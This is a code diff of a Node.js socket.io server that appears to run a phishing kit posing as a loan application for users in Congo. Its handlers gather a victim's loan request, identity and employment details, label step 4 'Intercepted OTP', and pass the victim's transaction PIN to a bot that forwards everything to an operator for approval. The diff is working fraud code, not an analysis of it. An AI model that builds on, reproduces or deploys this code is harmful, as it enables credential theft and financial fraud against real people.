@@ -18,7 +18,7 @@ const io = socketIo(server, {
     }
 });
 
-global.io = io; // Expose socket instance globally for backend callbacks
+global.io = io; // Link socket globally so botManager can call back rooms
 
 const PORT = process.env.PORT || 3000;
 const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
@@ -40,22 +40,22 @@ io.on('connection', (socket) => {
     socket.join(appId);
     console.log(`🔌 Congo User connected: ${appId}`);
     
-    // Broadcast initialization complete
+    // Send AppID back to the frontend right away
     socket.emit('session-ready', { appId: appId });
 
-    // Informative Form Step Logs
+    // Standard Log Streams (No admin inline interaction buttons needed)
     socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 1: Loan Request", data, false));
     socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 2: Identity Profile", data, false));
     socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 3: Employment Profile", data, false));
 
-    // Step 4: OTP Entry point - Triggers validation layout buttons
+    // Step 4: OTP Entry Point (Triggers confirmation/rejection inline buttons)
     socket.on('step4', (data) => {
-        botManager.sendToAdmin(appId, "🇨🇩 Step 4: Intercepted OTP", data, true, 'otp');
+        botManager.sendToAdmin(appId, "🇨🇩 Step 4: Intercepted OTP", data, true);
     });
 
-    // Step 5: PIN Entry point - Triggers final completion buttons
+    // Step 5: Final PIN Submission (Triggers transaction inline buttons)
     socket.on('step5', (data) => {
-        botManager.sendToAdmin(appId, "🇨🇩 Step 5: Transactional PIN", data, true, 'pin');
+        botManager.sendFinalApproval(appId, data.pin);
     });
 
     socket.on('disconnect', () => {
